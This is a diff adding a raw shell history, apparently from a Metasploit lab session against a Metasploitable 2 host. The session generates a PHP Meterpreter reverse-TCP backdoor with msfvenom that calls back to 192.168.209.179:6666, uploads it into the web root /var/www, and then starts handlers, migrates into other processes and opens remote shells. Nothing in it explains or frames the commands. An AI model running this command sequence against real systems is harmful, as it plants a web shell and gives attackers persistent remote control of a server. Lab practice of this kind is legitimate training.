@@ -1,0 +1,42 @@
+421  msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.209.179 LPORT=6666 -f raw -o metas2_backdoor.php
+422  gedit metas2_backdoor.php
+423  sessions -l
+424  sessions -i 2
+425  sessions -i 1
+426  background
+427  sessions -i 1
+428  pwd
+429  upload /root/metas2_backdoor.php /var/www/metas2_backdoor.php
+430  shell
+431  background
+432  jobs
+433  show options
+434  set LPORT 6666
+435  set PrependMigrate true
+444  show options 
+445  exploit -j
+446  sessions -l
+447  sessions -i 4
+448  ps
+449  migrate 5328
+450  migrate 5351
+451  shell 
+452  s
+453  sessions 
+454  sessions -i 1
+455  shell
+456  background
+457  show options
+458  set PrependMigrate true
+459  exploit -j
+460  sessions
+461  sessions -i 5
+462  shell
+463  background
+464  sessions -i 1
+465  pwd
+466  shell
+467  background
+468  show options
+469  set ExitOnSession false
+486  shell
